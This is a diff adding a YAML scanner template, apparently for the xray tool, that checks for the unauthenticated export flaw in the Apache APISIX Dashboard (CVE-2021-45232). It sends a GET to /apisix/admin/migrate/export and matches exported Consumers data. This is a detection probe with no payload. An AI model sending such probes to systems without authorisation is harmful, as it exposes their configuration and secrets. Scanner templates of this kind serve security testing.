@@ -1,0 +1,15 @@
+name: poc-yaml-Apache-apisix-Dashboard-api-unauth-rce
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /apisix/admin/migrate/export
+        expression: response.status == 200 && response.body.bcontains(b"{\"Consumers") || response.body.bcontains(b"{\"Counsumers") && response.headers["Content-Type"].contains("application/octet-stream")
+expression: r0()
+detail:
+    author: Dale
+    links:
+        - https://github.com/shakeman8/CVE-2021-45232-RCE
